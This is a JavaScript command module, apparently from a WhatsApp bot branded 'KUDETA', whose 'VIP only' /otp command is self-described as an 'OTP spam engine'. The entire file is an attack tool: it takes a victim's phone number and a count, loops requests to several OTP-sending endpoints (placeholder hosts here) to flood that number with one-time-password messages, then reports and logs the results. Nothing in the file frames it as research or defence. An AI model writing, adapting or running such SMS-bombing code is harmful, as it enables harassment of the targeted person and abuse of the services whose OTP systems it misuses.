const axios = require('axios');

module.exports = {
    name: 'otp',
    description: 'OTP spam engine',
    category: 'vip',
    
    async execute({ sock, sender, senderJid, args, auth, config, report }) {
        if (!await auth.isVIP(senderJid)) {
            return await sock.sendMessage(sender, { text: '[KUDETA] VIP only.' });
        }

        const targetNumber = args[0];
        const count = parseInt(args[1]) || 10;
        
        if (!targetNumber) {
            return await sock.sendMessage(sender, { text: '[KUDETA] Usage: /otp <number> [count]' });
        }

        const phone = targetNumber.replace(/[^0-9]/g, '');
        const limit = Math.min(count, config.maxSpam);

        await sock.sendMessage(sender, { 
            text: `[KUDETA] 🚀 OTP Spam initiated...\nTarget: ${phone}\nCount: ${limit}\nStatus: RUNNING`
        });

        let success = 0;
        let failed = 0;

        const spamEndpoints = [
            { url: 'https://api.example.com/otp/send', method: 'POST', data: { phone } },
            { url: 'https://api.service.com/v1/otp', method: 'POST', data: { msisdn: phone } },
            { url: `https://api.app.com/otp?phone=${phone}`, method: 'GET' }
        ];

        for (let i = 0; i < limit; i++) {
            for (const endpoint of spamEndpoints) {
                try {
                    if (endpoint.method === 'POST') {
                        await axios.post(endpoint.url, endpoint.data, { timeout: 5000 });
                    } else {
                        await axios.get(endpoint.url, { timeout: 5000 });
                    }
                    success++;
                } catch {
                    failed++;
                }
                await new Promise(r => setTimeout(r, config.spamDelay));
            }
        }

        await sock.sendMessage(sender, { 
            text: `[KUDETA] ✓ OTP Spam Complete\n` +
                  `Target: ${phone}\n` +
                  `Success: ${success}\n` +
                  `Failed: ${failed}\n` +
                  `Total: ${success + failed}`
        });

        await report.logCommand('otp', { target: phone, success, failed, by: senderJid });
    }
};
